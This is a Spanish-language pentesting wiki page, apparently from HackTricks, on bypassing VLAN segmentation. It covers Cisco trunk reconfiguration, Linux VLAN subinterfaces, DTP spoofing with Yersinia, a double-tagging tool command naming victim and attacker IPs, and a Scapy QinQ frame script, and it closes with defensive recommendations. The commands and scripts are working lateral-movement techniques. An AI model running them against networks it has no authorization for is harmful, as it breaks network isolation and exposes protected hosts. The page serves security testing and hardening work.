# Bypass de Segmentación VLAN Lateral

{{#include ../../banners/hacktricks-training.md}}

Si se tiene acceso directo a un switch, se puede eludir la segmentación VLAN. Esto implica reconfigurar el puerto conectado a modo trunk, establecer interfaces virtuales para las VLANs objetivo y configurar direcciones IP, ya sea de forma dinámica (DHCP) o estática, dependiendo del escenario (**para más detalles consulta [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)).**

Inicialmente, se requiere la identificación del puerto conectado específico. Esto se puede lograr típicamente a través de mensajes CDP, o buscando el puerto mediante la máscara **include**.

**Si CDP no está operativo, se puede intentar la identificación del puerto buscando la dirección MAC**:
```
SW1(config)# show mac address-table | include 0050.0000.0500
```
Antes de cambiar al modo trunk, se debe compilar una lista de VLANs existentes y determinar sus identificadores. Estos identificadores se asignan a la interfaz, lo que permite el acceso a varias VLANs a través del trunk. El puerto en uso, por ejemplo, está asociado con la VLAN 10.
```
SW1# show vlan brief
```
**La transición al modo trunk implica ingresar al modo de configuración de la interfaz**:
```
SW1(config)# interface GigabitEthernet 0/2
SW1(config-if)# switchport trunk encapsulation dot1q
SW1(config-if)# switchport mode trunk
```
Cambiar a modo trunk interrumpirá temporalmente la conectividad, pero esto se puede restaurar posteriormente.

Luego se crean interfaces virtuales, se asignan IDs de VLAN y se activan:
```bash
sudo vconfig add eth0 10
sudo vconfig add eth0 20
sudo vconfig add eth0 50
sudo vconfig add eth0 60
sudo ifconfig eth0.10 up
sudo ifconfig eth0.20 up
sudo ifconfig eth0.50 up
sudo ifconfig eth0.60 up
```
A continuación, se realiza una solicitud de dirección a través de DHCP. Alternativamente, en casos donde DHCP no es viable, las direcciones se pueden configurar manualmente:
```bash
sudo dhclient -v eth0.10
sudo dhclient -v eth0.20
sudo dhclient -v eth0.50
sudo dhclient -v eth0.60
```
Ejemplo para configurar manualmente una dirección IP estática en una interfaz (VLAN 10):
```bash
sudo ifconfig eth0.10 10.10.10.66 netmask 255.255.255.0
```
La conectividad se prueba iniciando solicitudes ICMP a las puertas de enlace predeterminadas para las VLANs 10, 20, 50 y 60.

En última instancia, este proceso permite eludir la segmentación de VLAN, facilitando así el acceso sin restricciones a cualquier red VLAN y preparando el escenario para acciones posteriores.

---

## Otras técnicas de VLAN-Hopping (sin CLI privilegiada del switch)

El método anterior asume acceso autenticado a la consola o Telnet/SSH al switch. En compromisos del mundo real, el atacante generalmente está conectado a un **puerto de acceso regular**. Los siguientes trucos de Capa 2 a menudo te permiten pivotar lateralmente sin necesidad de iniciar sesión en el sistema operativo del switch:

### 1. Spoofing de Switch con Protocolo de Trunking Dinámico (DTP)

Los switches Cisco que mantienen DTP habilitado negociarán felizmente un trunk si el par afirma ser un switch. Crear un solo marco **DTP “deseable”** o **“trunk”** convierte el puerto de acceso en un trunk 802.1Q que transporta *todas* las VLANs permitidas.

*Yersinia* y varios PoCs automatizan el proceso:
```bash
# Become a trunk using Yersinia (GUI)
$ sudo yersinia -G          # Launch GUI → Launch attack → DTP → enabling trunking

# Python PoC (dtp-spoof)
$ git clone https://github.com/fleetcaptain/dtp-spoof.git
$ sudo python3 dtp-spoof/dtp-spoof.py -i eth0 --desirable
```
Una vez que el puerto cambia a trunk, puedes crear subinterfaces 802.1Q y pivotar exactamente como se mostró en la sección anterior. Los núcleos de Linux modernos ya no requieren *vconfig*; en su lugar, usa *ip link*:
```bash
sudo modprobe 8021q
sudo ip link add link eth0 name eth0.30 type vlan id 30
sudo ip addr add 10.10.30.66/24 dev eth0.30
sudo ip link set eth0.30 up
```
### 2. Doble Etiquetado (Abuso de VLAN Nativa)

Si el atacante está en la **VLAN nativa (sin etiquetar)**, un marco diseñado con *dos* encabezados 802.1Q puede "saltar" a una segunda VLAN incluso cuando el puerto está bloqueado en modo de acceso. Herramientas como **VLANPWN DoubleTagging.py** (actualización 2022-2024) automatizan la inyección:
```bash
python3 DoubleTagging.py \
--interface eth0 \
--nativevlan 1 \
--targetvlan 20 \
--victim 10.10.20.24 \
--attacker 10.10.1.54
```
Packet walk-through:
1. La etiqueta externa (1) es eliminada por el primer switch porque coincide con la VLAN nativa.
2. La etiqueta interna (20) ahora está expuesta; el marco se reenvía al tronco hacia la VLAN 20.

La técnica aún funciona en 2025 en redes que dejan la VLAN nativa en el valor predeterminado y aceptan tramas sin etiquetar.

### 3. QinQ (802.1ad) Stacking

Muchos núcleos empresariales soportan encapsulación de proveedor de servicio *Q-in-Q*. Donde se permite, un atacante puede tunelizar tráfico etiquetado 802.1Q arbitrario dentro de un proveedor (S-tag) para cruzar zonas de seguridad. Captura para el ethertype 802.1ad 0x88a8 e intenta eliminar la etiqueta externa con Scapy:
```python
from scapy.all import *
outer = 100      # Service tag
inner = 30       # Customer / target VLAN
payload = Ether(dst="ff:ff:ff:ff:ff:ff")/Dot1Q(vlan=inner)/IP(dst="10.10.30.1")/ICMP()
frame = Dot1Q(type=0x88a8, vlan=outer)/payload
sendp(frame, iface="eth0")
```
---

## Recomendaciones Defensivas

1. Desactivar DTP en todos los puertos de usuario: `switchport mode access` + `switchport nonegotiate`.
2. Cambiar la VLAN nativa en cada troncal a una **VLAN no utilizada, de agujero negro** y etiquetarla: `vlan dot1q tag native`.
3. Podar VLANs innecesarias en los troncales: `switchport trunk allowed vlan 10,20`.
4. Hacer cumplir la seguridad de puertos, DHCP snooping y la inspección dinámica de ARP para limitar la actividad no autorizada de Capa 2.
5. Preferir VLANs privadas o segmentación L3 en lugar de depender únicamente de la separación 802.1Q.

---

## Referencias

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- Herramienta de ataque VLANPWN – <https://github.com/casterbytethrowback/VLANPWN>
- Twingate "¿Qué es VLAN Hopping?" (Ago 2024) – <https://www.twingate.com/blog/glossary/vlan%20hopping>

{{#include ../../banners/hacktricks-training.md}}
